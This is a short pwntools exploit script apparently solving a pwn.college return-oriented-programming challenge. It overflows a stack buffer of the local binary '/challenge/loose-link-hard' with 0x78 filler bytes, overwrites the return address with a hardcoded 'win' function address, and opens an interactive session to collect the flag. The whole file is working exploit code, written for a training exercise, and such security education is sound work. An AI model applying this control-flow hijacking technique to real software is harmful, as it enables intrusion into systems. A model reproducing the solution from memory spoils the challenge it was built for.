# the related url is https://pwn.college/program-security/return-oriented-programming/

from pwn import *

# Target information
win_addr = 0x00401432
offset = 0x78  # Distance from write start to return address

# Build payload
payload = b"A" * offset
payload += p64(win_addr)

# Start the challenge process
io = process("/challenge/loose-link-hard")

# Send the payload
io.send(payload)

# Get the flag
io.interactive()
